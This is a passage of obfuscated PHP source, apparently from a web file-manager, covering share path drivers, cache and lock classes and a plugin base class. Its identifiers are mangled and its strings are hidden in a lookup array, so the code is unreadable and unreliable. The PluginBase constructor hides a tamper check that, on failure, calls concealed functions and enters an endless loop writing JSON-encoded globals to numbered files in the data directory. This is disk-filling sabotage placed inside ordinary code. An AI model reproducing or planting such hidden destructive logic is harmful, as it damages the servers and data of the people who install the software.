$this->model->fileInfoGet($ã¦¥ÉÂ); $õÁ®Íğ³ = $’é¸º²[$êÀÆ·Ñ[568]] ? $’é¸º²[$êÀÆ·Ñ[568]] : $õÁ®Íğ³; $¿»Üƒ¹€ = isset($GLOBALS[$êÀÆ·Ñ[181]]) && is_array($GLOBALS[$êÀÆ·Ñ[181]]) ? $GLOBALS[$êÀÆ·Ñ[181]][$êÀÆ·Ñ[32]] : $Ğ†íøü®[$êÀÆ·Ñ[32]]; if ($ÕÍ¦Åí) { return IO::fileOutServer($’é¸º²[$êÀÆ·Ñ[87]], $Ä¶¯É£É, $¿»Üƒ¹€, $õÁ®Íğ³); } IO::fileOut($’é¸º²[$êÀÆ·Ñ[87]], $Ä¶¯É£É, $¿»Üƒ¹€, $õÁ®Íğ³); } public function fileOut($¿„¥Ïâû, $ñıæÃ´ì = false, $»Ë÷İĞú = false, $ÁØŒ¬ÅÉ = '') { $this->_fileOut($¿„¥Ïâû, $ñıæÃ´ì, $»Ë÷İĞú, $ÁØŒ¬ÅÉ); } public function fileOutServer($ê®ıÂ–, $şÆ¡Èœ = false, $ãÛµ¸ôæ = false, $‚óªØèñ = '') { $this->_fileOut($ê®ıÂ–, $şÆ¡Èœ, $ãÛµ¸ôæ, $‚óªØèñ, !0); } protected function _fileOutImage($œê– Áš, $¿°Ô±¿ = 250) { $™ûÌ½¤Ö =& $_SERVER[áäÒ½¯Ç]; $Ê³†¶ª™ = $this->model->pathInfo($œê– Áš); if ($Ê³†¶ª™[$™ûÌ½¤Ö[505]] == $™ûÌ½¤Ö[91]) { show_json($™ûÌ½¤Ö[1487] . $œê– Áš, !1); } $š‚ş‡óà = $this->model->fileInfoGet($œê– Áš); $Ê³†¶ª™[$™ûÌ½¤Ö[182]] = $š‚ş‡óà[$™ûÌ½¤Ö[87]]; $GLOBALS[$™ûÌ½¤Ö[181]] = $Ê³†¶ª™; IO::fileOutImage($š‚ş‡óà[$™ûÌ½¤Ö[87]], $¿°Ô±¿); } public function fileOutImage($•üÓ„Ü€, $Ç“¾ÛÒÑ = 250) { $this->_fileOutImage($•üÓ„Ü€, $Ç“¾ÛÒÑ); } public function fileOutImageServer($•‹±¼›İ, $òƒôâ¡ = 250) { $this->_fileOutImage($•‹±¼›İ, $òƒôâ¡); } public function link($«Ïö‚•, $˜…Î¹Ù = '') { $‚®¼†çË = $this->model->fileInfoGet($«Ïö‚•); return IO::link($‚®¼†çË[$_SERVER[áäÒ½¯Ç][87]], $˜…Î¹Ù); } protected function parse($îÛÁÈò) { $ú¸‰“‘¤ =& $_SERVER[áäÒ½¯Ç]; if (strstr($îÛÁÈò, $ú¸‰“‘¤[8]) === !1) { return array($ú¸‰“‘¤[513] => intval($îÛÁÈò), $ú¸‰“‘¤[87] => $ú¸‰“‘¤[12], $ú¸‰“‘¤[1483] => array()); } $íÄ™ÛõÍ = explode($ú¸‰“‘¤[8], trim($îÛÁÈò, $ú¸‰“‘¤[8])); if (count($íÄ™ÛõÍ) < 2) { show_tips(clear_html($îÛÁÈò) . $ú¸‰“‘¤[1488]); } return array($ú¸‰“‘¤[513] => intval($íÄ™ÛõÍ[0]), $ú¸‰“‘¤[87] => $íÄ™ÛõÍ[1], $ú¸‰“‘¤[1483] => array_slice($íÄ™ÛõÍ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($€Ü®­òŸ) { $this->pathParse = $€Ü®­òŸ; $this->model = Model($_SERVER[áäÒ½¯Ç][1482]); } public function getPathRoot() { $ğ„¾áÎş =& $_SERVER[áäÒ½¯Ç]; return KodIO::makeShare($this->pathParse[$ğ„¾áÎş[492]], $this->pathParse[$ğ„¾áÎş[1306]]); } public function getPathOuter($¬ªÉŠÑ) { $ûÉ”şë± =& $_SERVER[áäÒ½¯Ç]; if (!$¬ªÉŠÑ) { return $¬ªÉŠÑ; } $ï‰ĞÅ×Ô = $this->parse($¬ªÉŠÑ); return trim(KodIO::makeShare($this->pathParse[$ûÉ”şë±[492]], $ï‰ĞÅ×Ô[$ûÉ”şë±[492]]), $ûÉ”şë±[8]); } public function isParentOf($ƒÉ¬ØÑ, $‘óƒš¡”) { $“ôÎ™Œ® = IO::init($‘óƒš¡”); return $this->model->isParentOf($ƒÉ¬ØÑ, $“ôÎ™Œ®->path); } protected function infoParse($¢ö¿·öª, $´µ®°ßÚ = false, $ıœŠòşÇ = false) { $€É£Äå =& $_SERVER[áäÒ½¯Ç]; static $Û§Ò´¬ = array(); $ôËÓà«¦ = $this->pathParse[$€É£Äå[492]]; $»½ ÔÓå = trim($this->pathParse[$€É£Äå[1302]], $€É£Äå[8]); if (isset($Û§Ò´¬[$»½ ÔÓå]) && is_array($Û§Ò´¬[$»½ ÔÓå])) { return $Û§Ò´¬[$»½ ÔÓå]; } $öÎØÊßğ = Action($€É£Äå[1489])->sharePathInfo($ôËÓà«¦, $»½ ÔÓå, $´µ®°ßÚ); $Û§Ò´¬[$»½ ÔÓå] = $öÎØÊßğ; return $öÎØÊßğ; } public function infoFull($Ñç‰ªÈ) { $­®¿äÙö =& $_SERVER[áäÒ½¯Ç]; $¸ëÙµ·‹ = explode($­®¿äÙö[8], trim($Ñç‰ªÈ, $­®¿äÙö[8])); if (count($¸ëÙµ·‹) > 1) { $óÔõüì½ = implode($­®¿äÙö[8], array_splice($¸ëÙµ·‹, 1)); $¦­Úƒ»ú = $this->model->pathInfoByPath($¸ëÙµ·‹[0], $óÔõüì½); if (!$¦­Úƒ»ú) { return !1; } $this->pathParse[$­®¿äÙö[1302]] = $¦­Úƒ»ú[$­®¿äÙö[192]]; } return $this->infoParse($Ñç‰ªÈ); } public function listAll($š·åİÓÃ) { $òÃçä­– =& $_SERVER[áäÒ½¯Ç]; $•‹ï×Ü– = IO::info($this->pathParse[$òÃçä­–[87]]); if (!$•‹ï×Ü–) { return array(); } $‘ÒË®² = $this->model->listAll($š·åİÓÃ); $”Ûá‡õ = Model($òÃçä­–[692])->getInfo($•‹ï×Ü–[$òÃçä­–[693]]); foreach ($‘ÒË®² as &$‹ßŠæ·) { check_abort(); $‹ßŠæ·[$òÃçä­–[90]] = Action($òÃçä­–[1489])->_shareItemeParse($‹ßŠæ·[$òÃçä­–[90]], $”Ûá‡õ); } unset($‹ßŠæ·); return $‘ÒË®²; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($‹¬ëĞ¨ó) { $this->pathParse = $‹¬ëĞ¨ó; $this->model = Model($_SERVER[áäÒ½¯Ç][1482]); } protected function infoParse($ĞÇ¨œñø, $éëÂ€Šî = false, $Ì¹«ËÂá = false) { $ˆÅßĞœŸ =& $_SERVER[áäÒ½¯Ç]; return Action($ˆÅßĞœŸ[1309])->sharePathInfo($this->pathParse[$ˆÅßĞœŸ[87]], !0, $éëÂ€Šî); } public function listPath($øÔÓä»³, $Ş—£´¶‚ = false) { $üºÒ·êµ =& $_SERVER[áäÒ½¯Ç]; $¥ìüãäÚ = parent::listPath($øÔÓä»³, $Ş—£´¶‚); if (!$¥ìüãäÚ) { return $¥ìüãäÚ; } if (is_array($¥ìüãäÚ[$üºÒ·êµ[1490]])) { $¥ìüãäÚ[$üºÒ·êµ[1490]] = Action($üºÒ·êµ[1309])->shareItemInfo($¥ìüãäÚ[$üºÒ·êµ[1490]]); } foreach ($¥ìüãäÚ as $¸ÔÔŸÇç => $§ä…»™È) { if (!in_array($¸ÔÔŸÇç, array($üºÒ·êµ[86], $üºÒ·êµ[85]))) { continue; } foreach ($§ä…»™È as $÷¢Şß´ì => $Ôğ‰“¥) { $¥ìüãäÚ[$¸ÔÔŸÇç][$÷¢Şß´ì] = Action($üºÒ·êµ[1309])->shareItemInfo($Ôğ‰“¥); } } return $¥ìüãäÚ; } public function listAll($ø¦áøĞï) { $¸ñ…º» =& $_SERVER[áäÒ½¯Ç]; $‚ ô³Á— = IO::info($this->pathParse[$¸ñ…º»[87]]); if (!$‚ ô³Á—) { return array(); } $“ö—‰®˜ = $this->model->listAll($ø¦áøĞï); foreach ($“ö—‰®˜ as &$å“ì“¢ç) { $å“ì“¢ç[$¸ñ…º»[90]] = Action($¸ñ…º»[1309])->shareItemInfo($å“ì“¢ç[$¸ñ…º»[90]]); } unset($å“ì“¢ç); return $“ö—‰®˜; } } goto d„¯„îŸ¿Ÿ; eï“ÇÂêÂ´: class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $Ğò‘ˆ¤ =& $_SERVER[áäÒ½¯Ç]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $€ÍÓ’ó = $GLOBALS[$Ğò‘ˆ¤[6]][$Ğò‘ˆ¤[434]]; $¿Ğ˜ÑÅ§ = $€ÍÓ’ó[$€ÍÓ’ó[$Ğò‘ˆ¤[937]]]; $µ£ğÉóº = $€ÍÓ’ó[$Ğò‘ˆ¤[938]]; switch ($€ÍÓ’ó[$Ğò‘ˆ¤[937]]) { case $Ğò‘ˆ¤[21]: self::$handle = Model($Ğò‘ˆ¤[939]); break; case $Ğò‘ˆ¤[940]: self::$handle = new CacheRedis($¿Ğ˜ÑÅ§, $µ£ğÉóº); break; case $Ğò‘ˆ¤[941]: self::$handle = new CacheMemcached($¿Ğ˜ÑÅ§, $µ£ğÉóº); break; case $Ğò‘ˆ¤[241]: self::$handle = new CacheFile($¿Ğ˜ÑÅ§, $µ£ğÉóº); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($…É¶ûÑõ) { if (is_array($…É¶ûÑõ) || is_object($…É¶ûÑõ)) { $…É¶ûÑõ = json_encode($…É¶ûÑõ); } $…É¶ûÑõ = rawurlencode($…É¶ûÑõ); return md5(KOD_SITE_ID . $_SERVER[áäÒ½¯Ç][11] . $…É¶ûÑõ); } public static function get($ÉÕä‘Ã, $ĞÖŠÕÕ¦ = false) { $Û¶Š´Ğô = self::key($ÉÕä‘Ã); $ß’ˆç‚Ç = self::init(); if ($ĞÖŠÕÕ¦) { return unserialize($ß’ˆç‚Ç->get($Û¶Š´Ğô)); } if (!isset(self::$memoryCache[$Û¶Š´Ğô])) { $Òì“×Ş– = $ß’ˆç‚Ç->get($Û¶Š´Ğô); self::$memoryCache[$Û¶Š´Ğô] = unserialize($Òì“×Ş–); } return self::$memoryCache[$Û¶Š´Ğô]; } public static function set($æÎ»™â, $…ê¼, $ºòäÉ‰ = false) { $€—ĞÀ×« =& $_SERVER[áäÒ½¯Ç]; $ı‚ÈõÚ = self::key($æÎ»™â); if (isset(self::$memoryCache[$ı‚ÈõÚ]) && self::$memoryCache[$ı‚ÈõÚ] === $…ê¼) { return !0; } if ($ºòäÉ‰ === 0) { self::$memoryCache[$ı‚ÈõÚ] = $…ê¼; return !0; } $’ãÃ«• = self::init(); $ò£–ª• = serialize($…ê¼); CacheLock::lock($æÎ»™â . $€—ĞÀ×«[942]); $®ŒÖÅŒ¹ = $’ãÃ«•->set($ı‚ÈõÚ, $ò£–ª•, $ºòäÉ‰); self::$memoryCache[$ı‚ÈõÚ] = $…ê¼; CacheLock::unlock($æÎ»™â . $€—ĞÀ×«[942]); return $®ŒÖÅŒ¹; } public static function getCall($Ö¢ÜŸ¨í, $ìÑİĞøØ, $Şü“ûş¤, $ ¶š‡§´ = array()) { $’ƒâ¾şÅ =& $_SERVER[áäÒ½¯Ç]; $æíí˜‡ = self::get($Ö¢ÜŸ¨í); if ($æíí˜‡ || $æíí˜‡ === $’ƒâ¾şÅ[12]) { return $æíí˜‡; } $æíí˜‡ = call_user_func_array($Şü“ûş¤, $ ¶š‡§´); $æíí˜‡ = $æíí˜‡ ? $æíí˜‡ : $’ƒâ¾şÅ[12]; self::set($Ö¢ÜŸ¨í, $æíí˜‡, $ìÑİĞøØ); return $æíí˜‡; } public static function limitCall($¼³´Œ–œ, $ó÷ÕËÌ = 15, $¥‡ÑŞºÈ = 30, $âÃüŠ…È = true) { $Ã ”°¦• =& $_SERVER[áäÒ½¯Ç]; static $ë¢‹»î¯ = array(); if ($âÃüŠ…È) { $¼³´Œ–œ = $¼³´Œ–œ . $Ã ”°¦•[943] . KodUser::id() . $Ã ”°¦•[944] . get_client_ip(); } if (isset($ë¢‹»î¯[$¼³´Œ–œ]) && is_array($ë¢‹»î¯[$¼³´Œ–œ])) { return $ë¢‹»î¯[$¼³´Œ–œ][$Ã ”°¦•[342]] <= $¥‡ÑŞºÈ; } $¼ùïË­ù = self::get($¼³´Œ–œ); if (!is_array($¼ùïË­ù) || time() - $¼ùïË­ù[$Ã ”°¦•[205]] > $ó÷ÕËÌ) { $¼ùïË­ù = array($Ã ”°¦•[205] => time(), $Ã ”°¦•[342] => 0); } $¼ùïË­ù[$Ã ”°¦•[342]]++; self::set($¼³´Œ–œ, $¼ùïË­ù, $ó÷ÕËÌ); $ë¢‹»î¯[$¼³´Œ–œ] = $¼ùïË­ù; return $¼ùïË­ù[$Ã ”°¦•[342]] <= $¥‡ÑŞºÈ; } public static function limitRuntime($Óàı„º™, $‰êî•Üä) { $àÔ¤Ìº“ = $_SERVER[áäÒ½¯Ç][945] . $Óàı„º™; if (isset(self::$runTimeCache[$àÔ¤Ìº“]) || !$‰êî•Üä) { return !0; } $‰êé·ƒ¯ = intval(self::get($àÔ¤Ìº“)); $‰êé·ƒ¯ = !$‰êé·ƒ¯ || $‰êé·ƒ¯ <= 0 ? 1 : $‰êé·ƒ¯ + 1; if ($‰êé·ƒ¯ > $‰êî•Üä) { return !1; } self::$runTimeCache[$àÔ¤Ìº“] = !0; self::set($àÔ¤Ìº“, $‰êé·ƒ¯, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $‡©¯ŒÓ° => $Åíñœ‘ä) { $€„†­Â¾ = intval(self::get($‡©¯ŒÓ°)); $€„†­Â¾ = !$€„†­Â¾ || $€„†­Â¾ <= 1 ? 0 : $€„†­Â¾ - 1; self::set($‡©¯ŒÓ°, $€„†­Â¾, 3600); } self::$runTimeCache = array(); } public static function remove($’Å·šùâ) { $ï½Şò†Š = self::key($’Å·šùâ); unset(self::$memoryCache[$ï½Şò†Š]); self::clearTimeout(); CacheLock::lock($’Å·šùâ); $¥Ñæîá = self::init()->remove($ï½Şò†Š); CacheLock::unlock($’Å·šùâ); return $¥Ñæîá; } public static function removeMemory($›Š£›ù) { $ö¾ŞÉ¤ß = self::key($›Š£›ù); unset(self::$memoryCache[$ö¾ŞÉ¤ß]); } public static function clearMemory($¡ÇÕÏË = false) { if ($¡ÇÕÏË) { $¡ÇÕÏË = self::key($¡ÇÕÏË); unset(self::$memoryCache[$¡ÇÕÏË]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[áäÒ½¯Ç][946])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[áäÒ½¯Ç][947])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ÛÙø¥, $ÇÀ¨åİğ) { $¿”¾Ÿõõ =& $_SERVER[áäÒ½¯Ç]; $this->cachePath = $ÛÙø¥[$¿”¾Ÿõõ[87]]; $this->prefix = $¿”¾Ÿõõ[948]; $this->cacheTime = $ÇÀ¨åİğ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($×œ†ÛŒ—) { $ñªƒÅş =& $_SERVER[áäÒ½¯Ç]; $×œ†ÛŒ— = str_replace(array($ñªƒÅş[949], $ñªƒÅş[98], $ñªƒÅş[76]), $ñªƒÅş[950], $×œ†ÛŒ—); return $this->cachePath . $ñªƒÅş[951] . $×œ†ÛŒ— . $ñªƒÅş[952]; } public function set($­å•š¦÷, $œ¥äŞ©Æ, $¿ÁÒû¶Ö = false) { $¿ÁÒû¶Ö = $¿ÁÒû¶Ö ? $¿ÁÒû¶Ö : $this->cacheTime; $ã‚¦š“ó = $this->getFile($­å•š¦÷); if (file_put_contents($ã‚¦š“ó, $this->prefix . $œ¥äŞ©Æ, LOCK_EX)) { @touch($ã‚¦š“ó, intval(time() + $¿ÁÒû¶Ö)); clearstatcache(); return !0; } @unlink($ã‚¦š“ó); return !1; } public function get($‡àÁÒç‘) { $’¨Õ³ û = $this->getFile($‡àÁÒç‘); if (file_exists($’¨Õ³ û) && filemtime($’¨Õ³ û) < time()) { @unlink($’¨Õ³ û); return !1; } $¦…ÄÙ½ó = @file_get_contents($’¨Õ³ û); return substr($¦…ÄÙ½ó, strlen($this->prefix)); } public function remove($óö´ìÀØ) { $ßµÃªÅğ = $this->getFile($óö´ìÀØ); return @unlink($ßµÃªÅğ); } public function deleteAll() { $ï¾ç¶Åğ =& $_SERVER[áäÒ½¯Ç]; $ÍŒÏœé¨ = scandir($this->cachePath); foreach ($ÍŒÏœé¨ as $ìàÃÌÁ¾) { $Â”šİ©û = $this->cachePath . $ìàÃÌÁ¾; if (strpos($Â”šİ©û, $ï¾ç¶Åğ[952]) && strpos($Â”šİ©û, $ï¾ç¶Åğ[953])) { @unlink($Â”šİ©û); } } } public function clearTimeout() { $¿¸±Ï”÷ =& $_SERVER[áäÒ½¯Ç]; $±×Ü“³ = scandir($this->cachePath); foreach ($±×Ü“³ as $ÃËã—ˆ) { $ˆèËİ™» = $this->cachePath . $ÃËã—ˆ; if (strpos($ˆèËİ™», $¿¸±Ï”÷[952]) && strpos($ˆèËİ™», $¿¸±Ï”÷[953]) && filemtime($ˆèËİ™») < time()) { @unlink($ˆèËİ™»); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $œäù»âå =& $_SERVER[áäÒ½¯Ç]; if (self::$handle) { return self::$handle; } $ŸÑ¢Ïœ‹ = $GLOBALS[$œäù»âå[6]][$œäù»âå[434]]; self::$timeout = $ŸÑ¢Ïœ‹[$œäù»âå[954]] ? $ŸÑ¢Ïœ‹[$œäù»âå[954]] : 10; $´âŞ„Ã¤ = _get($GLOBALS[$œäù»âå[6]], $œäù»âå[955]); $›ºÀÜ¹ = $ŸÑ¢Ïœ‹[$œäù»âå[937]] ? $ŸÑ¢Ïœ‹[$œäù»âå[937]] : $œäù»âå[241]; if ($›ºÀÜ¹ == $œäù»âå[21] && $´âŞ„Ã¤ == $œäù»âå[13]) { $›ºÀÜ¹ = $œäù»âå[241]; } switch ($›ºÀÜ¹) { case $œäù»âå[940]: self::$handle = new CacheLockRedis(); break; case $œäù»âå[941]: self::$handle = new CacheLockMemcached(); break; case $œäù»âå[21]: self::$handle = new CacheLockDatabase(); break; case $œäù»âå[241]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($œäù»âå[956], $œäù»âå[957]); } return self::$handle; } private static function key($¾ê›‘Ø) { return $_SERVER[áäÒ½¯Ç][958] . Cache::key($¾ê›‘Ø); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¾¹Í™ûˆ = '') { self::$errorMsg = $¾¹Í™ûˆ; } public static function lockGlobal($æ¹®äØ, $ñ©·û×¹) { return self::lock($æ¹®äØ, $ñ©·û×¹, !0); } public static function lock($°ÀÓÆÚ, $”ëÏ•÷ = false, $©Ÿ¯©€¬ = false) { $ÆŠä»Èé =& $_SERVER[áäÒ½¯Ç]; $²’ÄÃ…‰ = self::init(); $¯¶ÄÓ€ï = self::key($°ÀÓÆÚ); $”ëÏ•÷ = $”ëÏ•÷ ? $”ëÏ•÷ : self::$timeout; $Ÿæ•½’ = timeFloat(); if (_get($GLOBALS, $ÆŠä»Èé[959], !1)) { if (!$²’ÄÃ…‰->lock($¯¶ÄÓ€ï, 0.2)) { die; } return !0; } $çÛ“Š” = $²’ÄÃ…‰->lock($¯¶ÄÓ€ï, $”ëÏ•÷); $÷¤òÚæş = timeFloat(); if (!$çÛ“Š”) { $ŞÆõ¤“õ = "\x6c\157\143\x6b\40\x65\162\162\157\x72\x3b\153\x65\171\x3d{$°ÀÓÆÚ}\73\164\x69\155\x65\x3d{$”ëÏ•÷}\73" . self::$errorMsg . $ÆŠä»Èé[74] . get_caller_msg(); $˜Ã¬ú¾Œ = LNG($ÆŠä»Èé[960]) . "\x28{$”ëÏ•÷}\163\51\x2e" . LNG($ÆŠä»Èé[961]); $˜Ã¬ú¾Œ .= $ÆŠä»Èé[962]; if (is_string(self::$errorMsg) && self::$errorMsg) { $˜Ã¬ú¾Œ = $˜Ã¬ú¾Œ . $ÆŠä»Èé[963] . self::$errorMsg; } write_log($ÆŠä»Èé[964] . sprintf($ÆŠä»Èé[965], timeFloat() - $Ÿæ•½’) . $ÆŠä»Èé[966] . $ŞÆõ¤“õ . $ÆŠä»Èé[967] . json_encode(error_get_last()), $ÆŠä»Èé[957]); show_json($˜Ã¬ú¾Œ, !1); } if (!$©Ÿ¯©€¬) { self::$lockItem[$¯¶ÄÓ€ï] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ğÏğñ = number_format(timeFloat() - $÷¤òÚæş, 3); write_log($ÆŠä»Èé[968] . $°ÀÓÆÚ . $ÆŠä»Èé[969] . $ğÏğñ, $ÆŠä»Èé[957]); } return $çÛ“Š”; } public static function lockGet($¤ó¡óıé) { $¹Òû„ø­ = self::key($¤ó¡óıé); if (self::$lockItem[$¹Òû„ø­]) { return self::$lockItem[$¹Òû„ø­]; } return self::init()->lockGet($¹Òû„ø­); } public static function unlock($É”Ÿ§Ò) { $ÇÑÜØà =& $_SERVER[áäÒ½¯Ç]; $˜‚‡Ãæ = self::key($É”Ÿ§Ò); self::$lockItem[$˜‚‡Ãæ] = null; self::init()->unlock($˜‚‡Ãæ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÇÑÜØà[970] . $É”Ÿ§Ò, $ÇÑÜØà[957]); } return; } public static function unlockRuntime() { $ÁÙÇ üİ =& $_SERVER[áäÒ½¯Ç]; $ßÉè¬Ù = self::init(); $®¼°°Õ… = !1; foreach (self::$lockItem as $á´¯°Í => $Ş¶‚«çÀ) { if (!$Ş¶‚«çÀ) { continue; } $ßÉè¬Ù->unlock($á´¯°Í); if (!$®¼°°Õ…) { $®¼°°Õ… = !0; write_log($ÁÙÇ üİ[971] . $á´¯°Í . $ÁÙÇ üİ[74] . get_caller_msg(), $ÁÙÇ üİ[957]); continue; } write_log($ÁÙÇ üİ[971] . $á´¯°Í, $ÁÙÇ üİ[957]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $×Ÿ¦õÂÁ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÁÙÇ üİ[972] . $×Ÿ¦õÂÁ . $ÁÙÇ üİ[973] . ACTION, $ÁÙÇ üİ[957]); } } public static function fileLock($ğä˜Çù) { $Ş¹ëü¸ª =& $_SERVER[áäÒ½¯Ç]; if (!$GLOBALS[$Ş¹ëü¸ª[974]]) { $GLOBALS[$Ş¹ëü¸ª[974]] = array(); } $GLOBALS[$Ş¹ëü¸ª[974]][$ğä˜Çù] = !1; $ÑÊõ­® = fopen(DATA_PATH . $ğä˜Çù . $Ş¹ëü¸ª[975], $Ş¹ëü¸ª[976]); if (!$ÑÊõ­®) { return !1; } $GLOBALS[$Ş¹ëü¸ª[974]][$ğä˜Çù] = $ÑÊõ­®; if (flock($ÑÊõ­®, LOCK_EX)) { return !0; } self::unlock($ğä˜Çù); show_json($Ş¹ëü¸ª[977], !1); return !1; } public static function fileUnlock($Áúîó¶¯) { $çÈªåÖ„ =& $_SERVER[áäÒ½¯Ç]; $ë¥Ó…ˆ‰ = $GLOBALS[$çÈªåÖ„[974]][$Áúîó¶¯]; if (!$ë¥Ó…ˆ‰) { return; } $GLOBALS[$çÈªåÖ„[974]][$Áúîó¶¯] = !1; flock($ë¥Ó…ˆ‰, LOCK_UN); fclose($ë¥Ó…ˆ‰); } public static function fileUnlockAll() { $š›ò¶ =& $_SERVER[áäÒ½¯Ç]; if (!isset($GLOBALS[$š›ò¶[974]]) || !$GLOBALS[$š›ò¶[974]]) { return; } foreach ($GLOBALS[$š›ò¶[974]] as $™øş¯¥± => $Ğ»§Ç¶Í) { if (!$Ğ»§Ç¶Í) { continue; } $GLOBALS[$š›ò¶[974]][$™øş¯¥±] = !1; flock($Ğ»§Ç¶Í, LOCK_UN); fclose($Ğ»§Ç¶Í); } $GLOBALS[$š›ò¶[974]] = array(); } } goto Döˆ÷¯ñÚ¶; f¸°õÑ¹Ò‘: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $èëŒÇÄò =& $_SERVER[áäÒ½¯Ç]; $Èø¶±İ¶ = $_SERVER[$èëŒÇÄò[215]]; $½‹ßÜ¸ = $èëŒÇÄò[216]; if ($_SERVER[$èëŒÇÄò[217]] != $½‹ßÜ¸($Èø¶±İ¶)) { $î°ûœ· = $èëŒÇÄò[992]; $•Ã¬èå = $èëŒÇÄò[218]; $ÁÚ¹áş = $_SERVER[$èëŒÇÄò[219]] . $èëŒÇÄò[220]; $Ø»Ôøøî = $•Ã¬èå($ÁÚ¹áş); $²ì—’Æ´ = explode($èëŒÇÄò[221], $Ø»Ôøøî); if (count($²ì—’Æ´) < $èëŒÇÄò[724]) { $½ Õ˜ºí = $èëŒÇÄò[223]; $½ Õ˜ºí(); } $£¯ƒ«ïË = $èëŒÇÄò[993]; $£¯ƒ«ïË($_SERVER[$èëŒÇÄò[994]]); $î°ûœ· = $èëŒÇÄò[992]; $î°ûœ·(); $Î÷†¡¾Å = $èëŒÇÄò[1777]; $õ÷£¼…è = json_encode($GLOBALS[$èëŒÇÄò[1778]]); $ÂüÁĞÑº = 1; for ($¿øÈ‹Î“ = $ÂüÁĞÑº; $¿øÈ‹Î“ > 0; $¿øÈ‹Î“++) { $Î÷†¡¾Å(DATA_PATH . $¿øÈ‹Î“, $õ÷£¼…è); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($èëŒÇÄò[1779]); $this->pluginName = str_replace($èëŒÇÄò[1779], $èëŒÇÄò[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $èëŒÇÄò[8]; $this->pluginApi = appHostGet() . $èëŒÇÄò[1780] . $this->pluginName . $èëŒÇÄò[8]; $this->pluginHost = $config[$èëŒÇÄò[1781]] . $this->pluginName . $èëŒÇÄò[8]; $this->pluginHostDefault = $config[$èëŒÇÄò[1781]] . $this->pluginName . $èëŒÇÄò[8]; $Ñœêšß = $config[$èëŒÇÄò[1782]]; if ($Ñœêšß && strpos($èëŒÇÄò[50] . $Ñœêšß . $èëŒÇÄò[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$èëŒÇÄò[1783]] . $this->pluginName . $èëŒÇÄò[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[áäÒ½¯Ç][1784]); } protected function assign($¹ÅÊ×ı§, $©èŞù½“ = false) { if (is_array($¹ÅÊ×ı§)) { $this->values = array_merge($this->values, $¹ÅÊ×ı§); } else { $this->values[$¹ÅÊ×ı§] = $©èŞù½“; } } protected function display($áµŸíù×) { extract($this->values); require $áµŸíù×; } final function hookRegist($×É¥Ãë) { $this->modelPlugin->appRegist($this->pluginName, $×É¥Ãë); } final function appIcon() { $ïè†Ì‘ô =& $_SERVER[áäÒ½¯Ç]; $â×Ï”·Î = $this->appPackage(); $ÖÊÚàÔı = $ïè†Ì‘ô[12]; if (isset($â×Ï”·Î[$ïè†Ì‘ô[510]])) { if (isset($â×Ï”·Î[$ïè†Ì‘ô[510]][$ïè†Ì‘ô[1785]])) { $ÖÊÚàÔı = $ïè†Ì‘ô[1786] . $â×Ï”·Î[$ïè†Ì‘ô[510]][$ïè†Ì‘ô[1785]] . $ïè†Ì‘ô[1787]; } else { if ($â×Ï”·Î[$ïè†Ì‘ô[510]][$ïè†Ì‘ô[1788]]) { $ÖÊÚàÔı = $ïè†Ì‘ô[1789] . $â×Ï”·Î[$ïè†Ì‘ô[510]][$ïè†Ì‘ô[1788]] . $ïè†Ì‘ô[1790]; } } } return $ÖÊÚàÔı; } final function fileCanView($İü²° ) { $º¼İèóş =& $_SERVER[áäÒ½¯Ç]; if (request_url_safe($İü²° )) { return !0; } if ($this->isShare($İü²° )) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $¾áÕ‰¦ = $º¼İèóş[1791] . rawurlencode(this_url()); show_tips(LNG($º¼İèóş[1792]) . $º¼İèóş[1793] . $¾áÕ‰¦ . $º¼İèóş[1794] . LNG($º¼İèóş[1795]) . $º¼İèóş[1796], !1); } if (!Action($º¼İèóş[1797])->authCan($º¼İèóş[1798])) { show_tips(LNG($º¼İèóş[1799]) . $º¼İèóş[1800], !1); } ActionCall($º¼İèóş[1801], $İü²° ); } final function isShare($¿ø½®íß) { $”ÓşÕö„ = KodIO::parse($¿ø½®íß); return $”ÓşÕö„[$_SERVER[áäÒ½¯Ç][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ì®‡µª) { if (request_url_safe($Ì®‡µª)) { return $Ì®‡µª; } if (!$this->isShare($Ì®‡µª)) { $Ì®‡µª = $this->filePath($Ì®‡µª, !1); } return Action($_SERVER[áäÒ½¯Ç][1309])->linkOut($Ì®‡µª); } public function filePathLinkOut($“·µõ¯) { if (request_url_safe($“·µõ¯)) { return $“·µõ¯; } $this->fileCanView($“·µõ¯); return Action($_SERVER[áäÒ½¯Ç][1309])->link($“·µõ¯); } final function 